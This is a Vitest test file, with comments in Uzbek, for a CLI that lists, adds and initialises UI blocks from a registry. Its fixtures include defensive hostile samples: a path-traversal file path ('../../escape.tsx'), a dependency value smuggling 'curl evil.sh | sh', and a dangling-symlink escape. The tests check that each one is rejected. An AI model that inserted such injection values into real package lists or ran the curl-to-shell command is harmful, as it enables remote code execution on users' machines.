import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import type { FetchLike } from './context';
import type { MainDeps } from './main';
import { HELP, VERSION, main } from './main';
import type { Prompter } from './ui';

const REGISTRY = 'https://registry.test/r';

/** Vaqtinchalik registry (fixture): bloklar shu yerda, apps/docs/blocks emas. */
const fixture: Record<string, unknown> = {
  'index.json': {
    version: 1,
    items: [
      {
        name: 'login',
        title: { uz: 'Kirish', en: 'Login' },
        description: { uz: 'Kirish formasi', en: 'Login form' },
        category: 'auth',
        dependencies: ['react-hook-form', 'zod'],
      },
      {
        name: 'pricing',
        title: { uz: 'Narxlar', en: 'Pricing' },
        description: { uz: 'Tariflar jadvali', en: 'Pricing table' },
        category: 'marketing',
        dependencies: [],
      },
    ],
  },
  'login.json': {
    name: 'login',
    title: { uz: 'Kirish', en: 'Login' },
    description: { uz: 'Kirish formasi', en: 'Login form' },
    dependencies: ['react-hook-form', 'zod'],
    files: [
      { path: 'login.tsx', content: "'use client';\nexport function Login() { return null; }\n" },
    ],
  },
  'pricing.json': {
    name: 'pricing',
    title: 'Narxlar',
    description: 'Tariflar jadvali',
    dependencies: [],
    files: [{ path: 'pricing.tsx', content: 'export function Pricing() { return null; }\n' }],
  },
  'evil.json': {
    name: 'evil',
    title: 'Evil',
    description: '',
    dependencies: [],
    files: [
      { path: 'ok.tsx', content: 'ok' },
      { path: '../../escape.tsx', content: 'pwned' },
    ],
  },
  'badshape.json': { name: 'badshape', files: 'nope' },
  'baddeps.json': {
    name: 'baddeps',
    title: 'x',
    dependencies: ['left-pad', 'zod && curl evil.sh | sh'],
    files: [{ path: 'baddeps.tsx', content: 'x' }],
  },
};

const fetchMock = vi.fn<FetchLike>(async (url) => {
  const key = url.slice(REGISTRY.length + 1);
  const body = fixture[key];
  if (!url.startsWith(REGISTRY) || body === undefined) {
    return { ok: false, status: 404, text: async () => 'not found' };
  }
  return { ok: true, status: 200, text: async () => JSON.stringify(body) };
});

let dir: string;
let out: string;
let err: string;
const run = vi.fn(async () => {});
const prompter = { confirm: vi.fn<Prompter['confirm']>(), text: vi.fn<Prompter['text']>() };

function cli(argv: string[], deps: Partial<MainDeps> = {}) {
  return main([...argv, '--registry', REGISTRY], {
    cwd: dir,
    env: {},
    stdout: { write: (s: string) => (out += s) },
    stderr: { write: (s: string) => (err += s) },
    interactive: false,
    prompter,
    fetch: fetchMock,
    run,
    ...deps,
  });
}

const read = (rel: string) => readFileSync(path.join(dir, rel), 'utf8');
const write = (rel: string, content: string) => {
  mkdirSync(path.dirname(path.join(dir, rel)), { recursive: true });
  writeFileSync(path.join(dir, rel), content);
};

beforeEach(() => {
  dir = mkdtempSync(path.join(tmpdir(), 'akh-cli-'));
  out = '';
  err = '';
  vi.clearAllMocks();
});
afterEach(() => rmSync(dir, { recursive: true, force: true }));

describe('umumiy', () => {
  it('--help va --version', async () => {
    expect(await main(['--help'], { stdout: { write: (s: string) => (out += s) }, env: {} })).toBe(
      0,
    );
    expect(out).toBe(HELP);
    out = '';
    expect(await main(['-v'], { stdout: { write: (s: string) => (out += s) }, env: {} })).toBe(0);
    expect(out.trim()).toBe(VERSION);
  });

  it("noma'lum buyruq — 1", async () => {
    expect(await cli(['deploy'])).toBe(1);
    expect(err).toMatch(/Noma'lum buyruq/);
  });

  it("--cwd mavjud bo'lmagan papka — 1", async () => {
    expect(await cli(['list', '--cwd', 'nope'])).toBe(1);
    expect(err).toMatch(/Papka topilmadi/);
  });
});

describe('list', () => {
  it("bloklar ro'yxatini kategoriya bo'yicha chiqaradi", async () => {
    expect(await cli(['list'])).toBe(0);
    expect(fetchMock).toHaveBeenCalledWith(`${REGISTRY}/index.json`, expect.anything());
    expect(out).toContain('Mavjud bloklar (2)');
    expect(out).toMatch(/auth\n\s+login\s+Kirish — Kirish formasi/);
    expect(out).toMatch(/marketing\n\s+pricing\s+Narxlar — Tariflar jadvali/);
  });

  it('lokal papka registry (oflayn)', async () => {
    write('reg/index.json', JSON.stringify(fixture['index.json']));
    const code = await main(['list', '--registry', 'reg'], {
      cwd: dir,
      env: {},
      stdout: { write: (s: string) => (out += s) },
      stderr: { write: (s: string) => (err += s) },
      fetch: fetchMock,
    });
    expect(code).toBe(0);
    expect(fetchMock).not.toHaveBeenCalled();
    expect(out).toContain('login');
  });
});

describe('add', () => {
  it("faylni standart papkaga yozadi va paketlarni --yes bilan o'rnatadi", async () => {
    write('package.json', JSON.stringify({ dependencies: { zod: '^4.0.0' } }));
    write('pnpm-lock.yaml', '');
    expect(await cli(['add', 'login', '--yes'])).toBe(0);
    expect(read('components/blocks/login.tsx')).toContain('export function Login');
    // zod allaqachon bor — faqat react-hook-form
    expect(run).toHaveBeenCalledWith('pnpm', ['add', 'react-hook-form'], dir);
  });

  it('--dir bilan bir nechta blok', async () => {
    expect(await cli(['add', 'login', 'pricing', '--dir', 'src/ui/blocks'])).toBe(0);
    expect(existsSync(path.join(dir, 'src/ui/blocks/login.tsx'))).toBe(true);
    expect(existsSync(path.join(dir, 'src/ui/blocks/pricing.tsx'))).toBe(true);
  });

  it("interaktiv bo'lmasa va --yes yo'q — paketlar o'rnatilmaydi, buyruq ko'rsatiladi", async () => {
    write('package.json', '{}');
    expect(await cli(['add', 'login'])).toBe(0);
    expect(run).not.toHaveBeenCalled();
    expect(out).toMatch(/Keyinroq o'rnatish: npm install react-hook-form zod/);
  });

  it('path traversal: hech qaysi fayl yozilmaydi', async () => {
    expect(await cli(['add', 'evil', '--yes'])).toBe(1);
    expect(err).toMatch(/Xavfli fayl yo'li/);
    expect(existsSync(path.join(dir, 'components/blocks/ok.tsx'))).toBe(false);
    expect(existsSync(path.join(dir, 'escape.tsx'))).toBe(false);
    expect(existsSync(path.join(dir, '..', 'escape.tsx'))).toBe(false);
  });

  it('--dir loyihadan tashqarida — rad etiladi', async () => {
    expect(await cli(['add', 'login', '--dir', '../outside'])).toBe(1);
    expect(err).toMatch(/tashqarida/);
  });

  it("noto'g'ri blok nomi va topilmagan blok", async () => {
    expect(await cli(['add', '../x'])).toBe(1);
    expect(err).toMatch(/Noto'g'ri blok nomi/);
    err = '';
    expect(await cli(['add', 'missing'])).toBe(1);
    expect(err).toMatch(/"missing" bloki topilmadi/);
  });

  it("registry shakli noto'g'ri — 1", async () => {
    expect(await cli(['add', 'badshape'])).toBe(1);
    expect(err).toMatch(/Registry formati/);
  });

  it("--no-install: --yes bo'lsa ham paketlar o'rnatilmaydi", async () => {
    write('package.json', '{}');
    expect(await cli(['add', 'login', '--yes', '--no-install'])).toBe(0);
    expect(run).not.toHaveBeenCalled();
    expect(out).toMatch(/Keyinroq o'rnatish: npm install react-hook-form zod/);
  });

  it('osilib qolgan symlink orqali tashqariga yozilmaydi', async () => {
    const outside = mkdtempSync(path.join(tmpdir(), 'akh-out-'));
    try {
      mkdirSync(path.join(dir, 'components/blocks'), { recursive: true });
      try {
        symlinkSync(path.join(outside, 'pwned.tsx'), path.join(dir, 'components/blocks/login.tsx'));
      } catch {
        return; // Windows'da symlink uchun ruxsat bo'lmasligi mumkin
      }
      expect(await cli(['add', 'login', '--overwrite'])).toBe(0);
      expect(err).toMatch(/symlink/);
      expect(existsSync(path.join(outside, 'pwned.tsx'))).toBe(false);
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it("xavfli paket nomlari o'rnatilmaydi", async () => {
    write('package.json', '{}');
    expect(await cli(['add', 'baddeps', '--yes'])).toBe(0);
    expect(err).toMatch(/Noto'g'ri paket nomi/);
    expect(run).toHaveBeenCalledWith('npm', ['install', 'left-pad'], dir);
  });

  describe('mavjud fayl', () => {
    beforeEach(() => write('components/blocks/login.tsx', 'MY CODE'));

    it("--yes: ustidan yozilmaydi (o'tkazib yuboriladi)", async () => {
      expect(await cli(['add', 'login', '--yes'])).toBe(0);
      expect(read('components/blocks/login.tsx')).toBe('MY CODE');
      expect(err).toMatch(/o'tkazib yuborildi/);
      expect(prompter.confirm).not.toHaveBeenCalled();
    });

    it('--overwrite: ustidan yoziladi, savolsiz', async () => {
      expect(await cli(['add', 'login', '--overwrite'], { interactive: true })).toBe(0);
      expect(read('components/blocks/login.tsx')).toContain('export function Login');
      expect(prompter.confirm).not.toHaveBeenCalledWith(expect.stringContaining('mavjud'), false);
    });

    it('interaktiv: so\'raydi, "yo\'q" → saqlanadi', async () => {
      prompter.confirm.mockResolvedValue(false);
      expect(await cli(['add', 'login'], { interactive: true })).toBe(0);
      expect(prompter.confirm).toHaveBeenCalledWith(
        expect.stringContaining('login.tsx mavjud'),
        false,
      );
      expect(read('components/blocks/login.tsx')).toBe('MY CODE');
    });

    it('interaktiv: "ha" → ustidan yoziladi', async () => {
      prompter.confirm.mockResolvedValue(true);
      expect(await cli(['add', 'login'], { interactive: true })).toBe(0);
      expect(read('components/blocks/login.tsx')).toContain('export function Login');
    });
  });
});

describe('init', () => {
  const css = "@import 'tailwindcss';\n\nbody { margin: 0; }\n";

  it("paketlarni o'rnatadi va CSS ni yangilaydi; ikkinchi marta o'zgartirmaydi", async () => {
    write('package.json', JSON.stringify({ devDependencies: { tailwindcss: '^4.1.0' } }));
    write('yarn.lock', '');
    write('src/app/globals.css', css);

    expect(await cli(['init', '--yes'])).toBe(0);
    expect(run).toHaveBeenCalledWith('yarn', ['add', '@akhatmirzo/ui', '@akhatmirzo/tokens'], dir);
    const patched = read('src/app/globals.css');
    expect(patched).toContain("@import '@akhatmirzo/tokens/theme.css';");
    expect(patched).toContain("@source '../../node_modules/@akhatmirzo/ui/dist';");
    expect(err).not.toMatch(/tailwindcss/);

    // idempotent
    out = '';
    expect(await cli(['init', '--yes'])).toBe(0);
    expect(read('src/app/globals.css')).toBe(patched);
    expect(out).toMatch(/allaqachon sozlangan/);
  });

  it("--no-install: paketlar o'rnatilmaydi, CSS baribir yangilanadi", async () => {
    write('package.json', JSON.stringify({ devDependencies: { tailwindcss: '^4.1.0' } }));
    write('app/globals.css', css);
    expect(await cli(['init', '--yes', '--no-install'])).toBe(0);
    expect(run).not.toHaveBeenCalled();
    expect(out).toMatch(/Keyinroq o'rnatish: npm install @akhatmirzo\/ui @akhatmirzo\/tokens/);
    expect(read('app/globals.css')).toContain("@import '@akhatmirzo/tokens/theme.css';");
  });

  it("paketlar allaqachon bo'lsa o'rnatmaydi; Tailwind yo'qligi haqida ogohlantiradi", async () => {
    write(
      'package.json',
      JSON.stringify({
        dependencies: { '@akhatmirzo/ui': '^0.3.0', '@akhatmirzo/tokens': '^0.2.0' },
      }),
    );
    write('app/globals.css', css);
    expect(await cli(['init', '--yes'])).toBe(0);
    expect(run).not.toHaveBeenCalled();
    expect(err).toMatch(/tailwindcss package.json'da topilmadi/);
    expect(read('app/globals.css')).toContain("@source '../node_modules/@akhatmirzo/ui/dist';");
  });

  it('Tailwind v3 — ogohlantirish', async () => {
    write('package.json', JSON.stringify({ devDependencies: { tailwindcss: '^3.4.0' } }));
    write('src/index.css', css);
    expect(await cli(['init', '--yes'])).toBe(0);
    expect(err).toMatch(/Tailwind CSS v4 talab qiladi/);
  });

  it("CSS topilmasa: --yes bilan xato, interaktivda so'raydi", async () => {
    write('package.json', '{}');
    expect(await cli(['init', '--yes'])).toBe(1);
    expect(err).toMatch(/Global CSS fayl topilmadi/);

    write('web/main.css', css);
    prompter.text.mockResolvedValue('web/main.css');
    prompter.confirm.mockResolvedValue(true);
    expect(await cli(['init'], { interactive: true })).toBe(0);
    expect(read('web/main.css')).toContain("@source '../node_modules/@akhatmirzo/ui/dist';");
  });

  it('--css loyihadan tashqarida — rad etiladi', async () => {
    write('package.json', '{}');
    expect(await cli(['init', '--yes', '--css', '../x.css'])).toBe(1);
    expect(err).toMatch(/tashqarida/);
  });

  it("package.json yo'q yoki interaktiv emas (--yes siz) — 1", async () => {
    expect(await cli(['init', '--yes'])).toBe(1);
    expect(err).toMatch(/package.json topilmadi/);
    write('package.json', '{}');
    err = '';
    expect(await cli(['init'])).toBe(1);
    expect(err).toMatch(/--yes/);
  });
});
